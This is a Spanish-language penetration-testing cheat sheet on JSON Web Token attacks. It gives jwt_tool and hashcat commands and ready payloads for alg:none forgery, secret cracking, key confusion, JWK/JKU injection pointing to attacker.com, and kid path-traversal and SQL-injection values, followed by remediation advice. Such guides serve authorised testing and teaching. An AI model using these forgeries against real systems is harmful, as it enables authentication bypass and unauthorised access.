<!-- language-home-navigation -->
[🏠 Página Principal Española](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🎟️ Ataques JWT: hoja de referencia completa

[🇹🇷 Türkçe Sürüm](traducciones/README.tr.md)
```
       ██╗██╗    ██╗████████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗
       ██║██║    ██║╚══██╔══╝    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝
       ██║██║ █╗ ██║   ██║       ███████║   ██║      ██║   ███████║██║     █████═╝ ███████╗
  ██   ██║██║███╗██║   ██║       ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ╚════██║
  ╚█████╔╝╚███╔███╔╝   ██║       ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗███████║
   ╚════╝  ╚══╝╚══╝    ╚═╝       ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝
             JSON Web Token Exploitation & Security Testing Guide
```
<p align="centro">
  <img src="https://img.shields.io/badge/JWT-Attacks-orange?style=for-the-badge" alt="Ataques JWT">
  <img src="https://img.shields.io/badge/jwt_tool-Automated_Testing-blue?style=for-the-badge" alt="jwt_tool">
  <img src="https://img.shields.io/badge/Algorithm_Confusion-Key_Attacks-red?style=for-the-badge" alt="Ataques clave">
  <img src="https://img.shields.io/badge/Web_Security-API_Testing-green?style=for-the-badge" alt="Pruebas de API">
</p>

<p align="centro">
  <b>🛡️ Metodología completa y comandos prácticos para explotar las vulnerabilidades del JSON Web Token (JWT)</b>
</p>

---

## 📋 Tabla de contenidos

- [Introducción y anatomía de un JWT](#-introducción--anatomía-de-un-jwt)
- [Herramientas de prueba esenciales](#-herramientas-de-pruebas-esenciales)
- [Matriz de vulnerabilidad y vectores de ataque](#-matriz-de-vulnerabilidad--vectores-de-ataque)
  - [1. Ninguno fallo de algoritmo (`alg: "none"`)](#1-ninguno-algoritmo-fallo-alg-ninguno)
  - [2. Cracking secreto de HMAC débil (HS256)](#2-cracking-secreto-de-hmac-débil-hs256)
  - [3. Confusión de algoritmo/confusión de claves (RS256 -> HS256)](#3-confusión-algoritmo--confusión-clave-rs256---hs256)
  - [4. Inyección de encabezado JWK (clave web JSON)](#4-jwk-json-web-key-header-injection)
  - [5. Configuración incorrecta de JKU (URL de configuración de JWK) y SSRF](#5-jku-jwk-set-url-misconfiguration--ssrf)
  - [6. Manipulación e inyecciones del encabezado KID (ID de clave)](#6-manipulación-del-encabezado-id-de-clave-kid--inyecciones)
  - [7. Retransmisión entre servicios y fuga de datos confidenciales] (#7-retransmisión-entre-servicios--fuga-de-datos-sensibles)
- [Automatización de pruebas con `jwt_tool`](#-automatización-de-pruebas-con-jwt_tool)
- [Descifrando secretos de JWT con Hashcat] (#-cracking-jwt-secrets-with-hashcat)
- [Tabla de referencia rápida](#-tabla-de-referencia-rápida)
- [Remediación e implementación segura](#-remediación--implementación-segura)
- [Aviso legal](#-aviso-legal)
- [Recursos](#-recursos)

---

## 🎯 Introducción y anatomía de un JWT

Un **JSON Web Token (JWT)** es un medio compacto y seguro para URL de representar reclamos entre dos partes. Se utiliza comúnmente para la autenticación de sesiones en API REST modernas, aplicaciones de página única (SPA) y microservicios.

Un JWT estándar consta de tres partes codificadas en Base64URL separadas por puntos (`.`):
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTYiLCJuYW1lIjoiQWxpY2UiLCJyb2xlIjoidXNlciJ9.4z7kE8l...
[------------- HEADER -------------].[-------------- PAYLOAD --------------].[----------- SIGNATURE -----------]
```
1. **Encabezado:** Identifica el tipo de token y el algoritmo criptográfico utilizado (por ejemplo, `HS256`, `RS256`, `none`).
2. **Carga útil:** Contiene las reclamaciones (por ejemplo, `user_id`, `role`, vencimiento `exp`). *Nota: ¡Las cargas útiles están codificadas, NO cifradas!*
3. **Firma:** Se crea aplicando hash al encabezado codificado y la carga útil mediante una clave secreta o privada.

---

## 🛠️ Herramientas de prueba esenciales

1. **jwt_tool:** Conjunto de herramientas de línea de comandos para analizar, probar y descifrar JWT.
2. **Hashcat:** Rápido descifrado secreto HMAC basado en GPU (modo `16500`).
3. **Extensión Burp Suite:** "JWT Editor" de Fraser Winterborn (en PortSwigger BApp Store).

### Instalando `jwt_tool`
```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
python3 -m pip install -r requirements.txt
alias jwt_tool='python3 /opt/jwt_tool/jwt_tool.py'
```
---

## 💥 Matriz de vulnerabilidad y vectores de ataque

### 1. Ningún defecto de algoritmo (`alg: "none"`)

**Mecanismo:**
Algunas bibliotecas de verificación JWT consideran que los tokens son válidos si el encabezado `alg` está configurado en `none`, omitiendo por completo la verificación de firma.

**Explotación:**
1. Decodifica el encabezado y cambia `"alg": "HS256"` a `"alg": "none"`.
2. Modificar los reclamos de carga útil (por ejemplo, `"role": "admin"`).
3. Retire la parte de la firma (¡conserve el punto final!).
```bash
# Using jwt_tool to forge 'none' algorithm token
python3 jwt_tool.py <TOKEN> -X a

# Test various casing variations (none, None, NONE, nOnE)
python3 jwt_tool.py <TOKEN> -T -S none
```
*Estructura de tokens manual:*
```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.
```
---

### 2. Cracking secreto de HMAC débil (HS256)

**Mecanismo:**
Si el servidor firma tokens utilizando algoritmos simétricos (`HS256`, `HS384`, `HS512`) con una clave secreta débil o adivinable (por ejemplo, `secret`, `admin123`, nombre de la empresa), un atacante puede forzar el secreto fuera de línea y firmar tokens arbitrarios.

**Rompiendo con Hashcat:**
```bash
# Save the full JWT to a file
echo "eyJhbGciOi..." > jwt.txt

# Crack using Hashcat Mode 16500 (JWT Secret)
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt
```
**Forjar token después de descifrarlo:**
```bash
python3 jwt_tool.py <TOKEN> -T -S hs256 -p 'discovered_secret'
```
---

### 3. Confusión de algoritmos/Confusión de claves (RS256 -> HS256)

**Mecanismo:**
- **RS256 (Asimétrico):** Firmado con la clave privada del servidor; verificado con la **clave pública** del servidor.
- **HS256 (Simétrico):** Firmado y verificado con el **mismo secreto compartido**.

Si la biblioteca backend no aplica estrictamente los tipos de algoritmos, un atacante puede:
1. Obtenga la clave pública del servidor (a menudo expuesta públicamente en `/.well-known/jwks.json` o certificados).
2. Cambie el encabezado del algoritmo del token de `RS256` a `HS256`.
3. ¡Firme el token modificado con la **clave pública** del servidor como secreto HMAC!
4. El servidor recibe el token, ve `HS256` y verifica la firma utilizando su clave de verificación configurada (que es su clave pública), lo que da como resultado una firma válida.

**Explotación vía `jwt_tool`:**
```bash
# Supply the server's public key and perform key confusion
python3 jwt_tool.py <TOKEN> -X k -pk public.pem
```
---

### 4. Inyección de encabezado JWK (clave web JSON)

**Mecanismo:**
La especificación JWT permite una clave pública integrada en el parámetro del encabezado `jwk`. Los servidores vulnerables confían en esta clave de encabezado para verificar la firma sin verificar si la clave pertenece a una CA confiable o a una lista blanca previamente compartida.

**Explotación:**
1. Genere un par de claves RSA del atacante.
2. Incruste la clave pública en el encabezado `jwk`.
3. Firme el token con su clave privada correspondiente.
```bash
# Inject self-signed key in header using jwt_tool
python3 jwt_tool.py <TOKEN> -X i
```
---

### 5. Error de configuración de JKU (JWK Set URL) y SSRF

**Mecanismo:**
El encabezado `jku` (JWK Set URL) especifica una URL remota desde la cual el servidor debe obtener la clave pública configurada para verificar el token.

**Explotación:**
1. Aloje su propio `jwks.json` en un servidor web atacante:
   ```json
   {
     "keys": [
       {
         "kty": "RSA",
         "e": "AQAB",
         "use": "sig",
         "kid": "attacker-key",
         "n": "..."
       }
     ]
   }
   ```
2. Modifique el encabezado del token:
   ```json
   {
     "alg": "RS256",
     "typ": "JWT",
     "jku": "http://attacker.com/jwks.json",
     "kid": "attacker-key"
   }
   ```
3. Firme el token con su clave privada.

> **Omitir listas blancas de URL:**
> Si la aplicación valida las terminaciones de dominio, pruebe las redirecciones abiertas o las peculiaridades del análisis de URL:
> - `https://trusted.com@attacker.com/jwks.json`
> - `https://trusted.com.attacker.com/jwks.json`
> - Abrir redirección: `https://trusted.com/redirect?url=http://attacker.com/jwks.json`

---

### 6. Manipulación e inyecciones de encabezados KID (Key ID)

El encabezado `kid` es una cadena que se utiliza para identificar qué clave debe cargarse desde una base de datos o sistema de archivos.

#### A. Recorrido de directorio hasta archivo vacío (`/dev/null`)
Si el servidor lee el archivo de clave del disco usando `kid`:
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "/dev/null"
}
```
¡Firme el token con un secreto vacío (`""` / 0 bytes)!

#### B. Inyección SQL a través de KID
Si el servidor recupera el secreto de una base de datos:
```sql
SELECT secret FROM keys WHERE kid = 'INPUT';
```
Inyecte una cadena estática conocida:
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key' UNION SELECT 'my_known_secret'-- -"
}
```
Firme el token usando el secreto `'my_known_secret'`.

---

### 7. Retransmisión entre servicios y fuga de datos confidenciales

- **PII no cifrada:** Los desarrolladores frecuentemente almacenan contraseñas, SSN o metadatos confidenciales del usuario en la carga útil, olvidando que solo está codificada en Base64URL, no cifrada.
- **Confusión de servicio:** Uso de un token destinado a un servicio con pocos privilegios (por ejemplo, API de análisis) frente a una API administrativa interna.

---

## ⚡ Automatización de pruebas con `jwt_tool`

### Ejecute todos los ataques de Playbook integrados
La forma más sencilla de buscar automáticamente todas las vulnerabilidades conocidas:
```bash
# Launch full automated playbook scan
python3 jwt_tool.py <TOKEN> -M pb -t https://target.com/api/user -rh "Authorization: Bearer <TOKEN>"
```
### Modo de manipulación interactiva
```bash
# Interactively edit header or payload claims
python3 jwt_tool.py <TOKEN> -T
```
---

## 🔓 Descifrando los secretos de JWT con Hashcat
```bash
# 1. Format: Put token alone in a file
echo "eyJhbGciOiJIUzI1NiIsInR5..." > jwt.txt

# 2. Dictionary attack using rockyou
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt -w 3

# 3. Rule-based attack
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
---

## 📊 Tabla de referencia rápida

| Vulnerabilidad | Técnica de ataque | Carga útil clave/bandera |
|--------------|------------------|--------------------|
| **Ningún algoritmo** | Conjunto `alg: "none"`, firma de tira | `jwt_tool <TOKEN> -X a` |
| **Secreto débil** | Diccionario GPU fuerza bruta | `hashcat -m 16500 jwt.txt rockyou.txt` |
| **Confusión de algoritmo**| Cambie RS256 a HS256, firme con clave pública | `jwt_tool <TOKEN> -X k -pk pub.pem` |
| **Inyección JWK** | Incrustar la clave pública del atacante en el encabezado | `jwt_tool <TOKEN> -X i` |
| **Inyección JKU** | Apunte `jku` al servidor externo | `"jku": "http://evil.com/jwks.json"` |
| **Recorrido del camino para NIÑOS**| Apunte `kid` a `/dev/null` o archivo conocido | `"kid": "/dev/null"` (Firmar con `""`) |
| **NIÑO SQLi** | Inyectar secreto estático en una consulta SQL | `"kid": "' UNION SELECT 'secret'-- -"` |

---

## 🛡️ Remediación e implementación segura

1. **Algoritmos explícitamente incluidos en la lista blanca:**
   Nunca permita la selección `alg` controlada por el cliente. Codifique algoritmos permitidos en el servidor (por ejemplo, permita exclusivamente `RS256`).
2. **Rechazar tokens `alg: none`:**
   Asegúrese de que la biblioteca rechace estrictamente los tokens no verificados o sin firmar.
3. **Utilice secretos largos y criptográficamente seguros:**
   Los secretos HMAC deben tener al menos 256 bits (más de 32 caracteres aleatorios) generados por un CSPRNG seguro.
4. **Validar encabezados `jku` y `jwk`:**
   Obtenga únicamente conjuntos JWK de una lista blanca estricta de URL internas confiables; rechazar dominios externos proporcionados por el usuario.
5. **Valores de desinfección de `kid`:**
   Trate a `kid` como una entrada de usuario que no es de confianza; desinfectar contra el cruce de directorios (`../`) y la inyección de SQL.

---

## ⚠️ Aviso legal

> **IMPORTANTE:** Los ataques JWT pueden provocar una omisión total de la autenticación y un acceso no autorizado a las bases de datos de las aplicaciones. Esta guía está destinada estrictamente a fines educativos y pruebas de penetración autorizadas.

---

## 📚 Recursos

- [Repositorio GitHub jwt_tool] (https://github.com/ticarpi/jwt_tool)
- [Academia de seguridad web PortSwigger: ataques JWT] (https://portswigger.net/web-security/jwt)
- [RFC 7519 - Estándar de token web JSON (JWT)] (https://datatracker.ietf.org/doc/html/rfc7519)